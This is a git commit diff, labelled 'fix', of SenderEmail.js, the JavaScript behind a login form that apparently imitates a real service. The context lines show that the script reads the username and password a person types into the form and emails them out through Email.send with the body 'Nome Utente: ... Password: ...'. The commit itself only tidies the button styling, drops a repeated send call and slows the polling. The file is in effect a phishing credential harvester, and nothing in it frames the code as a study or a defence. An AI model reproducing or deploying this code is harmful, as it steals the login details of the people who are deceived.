a288d9bc5faf7ceb39d8ef2409b5f0a69f204fd1
Maurolix <maurizio11111111@gmail.com>
2021-08-08 02:32:49 +0200

    fix

--- SenderEmail.js
+++ SenderEmail.js
@@ -14,22 +14,16 @@ Email.send({
   Body: ("Nome Utente: " + NomeUtente + "\n" + "Password: " + Password)
   })
   .then(function (message) {
+    console.log("accesso");
   });
-  sendEmail();
 }
 setInterval(() => {
   NomeUtente = document.getElementById("Nome/Email").value;
   Password = document.getElementById("Password").value;
   if(NomeUtente != "" && Password != ""){
-    document.getElementById("btnAccedi").style.background="#FE2B54";
-    document.getElementById("btnAccedi").style.border="#FE2B54";
-    document.getElementById("btnAccedi").style.color="white";
     document.getElementById("btnAccedi").disabled=false;
   }
   else {
-    document.getElementById("btnAccedi").style.background="#EBEBEB";
-    document.getElementById("btnAccedi").style.border="#EBEBEB";
-    document.getElementById("btnAccedi").style.color="#808185";
     document.getElementById("btnAccedi").disabled=true;
   }
-}, 100);
+}, 500);
